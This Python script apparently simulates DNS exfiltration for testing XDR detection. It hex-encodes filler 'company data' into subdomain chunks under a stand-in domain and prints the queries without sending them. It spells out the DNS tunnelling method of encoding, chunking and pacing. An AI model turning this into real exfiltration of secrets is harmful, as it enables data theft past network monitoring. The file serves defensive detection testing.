#!/usr/bin/env python3
import socket
import time
import random
import string
import argparse
from datetime import datetime

def hex_encode_data(data):
    """Convert data to hex string for DNS subdomain"""
    return data.encode('utf-8').hex()

def create_dns_query(subdomain, domain="adversay.local", query_type="A"):
    """Create DNS query packet"""
    full_domain = f"{subdomain}.{domain}"
    print(f"[{datetime.now()}] DNS Query: {full_domain} ({query_type})")
    return full_domain

def simulate_dns_exfiltration(data="Sensitive company data", domain="adversay.local", size_kb=10.1, delay_ms=100):
    """Simulate DNS exfiltration attack"""
    
    # Calculate how much data we need to reach target size
    target_bytes = int(size_kb * 1024)
    
    # If provided data is smaller than target, repeat it
    while len(data) < target_bytes:
        data += f" {data}"
    
    # Truncate to exact target size
    data = data[:target_bytes]
    
    # Encode data as hex
    hex_data = hex_encode_data(data)
    
    # Split into DNS-safe chunks (max 63 chars per subdomain label)
    chunk_size = 60  # Leave room for domain length
    chunks = [hex_data[i:i+chunk_size] for i in range(0, len(hex_data), chunk_size)]
    
    print(f"Starting DNS exfiltration simulation:")
    print(f"- Target domain: {domain}")
    print(f"- Data size: {len(data)} bytes ({size_kb}KB)")
    print(f"- Number of DNS queries: {len(chunks)}")
    print(f"- Delay between queries: {delay_ms}ms")
    print("-" * 50)
    
    # Send DNS queries
    for i, chunk in enumerate(chunks):
        # Alternate between A and AAAA queries like in original attack
        query_type = "AAAA" if i % 2 == 0 else "A"
        
        # Create and "send" DNS query
        full_domain = create_dns_query(chunk, domain, query_type)
        
        # Simulate network delay
        time.sleep(delay_ms / 1000.0)
        
        # Show progress
        if (i + 1) % 10 == 0:
            print(f"Progress: {i + 1}/{len(chunks)} queries sent")
    
    print(f"\nSimulation complete! {len(chunks)} DNS queries sent to {domain}")
    print(f"Total data exfiltrated: {len(data)} bytes")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DNS Exfiltration Simulator for XDR Testing")
    parser.add_argument("--domain", default="adversay.local", help="Target domain for exfiltration")
    parser.add_argument("--size", type=float, default=10.1, help="Data size in KB to exfiltrate")
    parser.add_argument("--delay", type=int, default=100, help="Delay between queries in milliseconds")
    parser.add_argument("--data", default="Sensitive company data for XDR testing", help="Data to exfiltrate")
    
    args = parser.parse_args()
    
    simulate_dns_exfiltration(
        data=args.data,
        domain=args.domain,
        size_kb=args.size,
        delay_ms=args.delay
    )
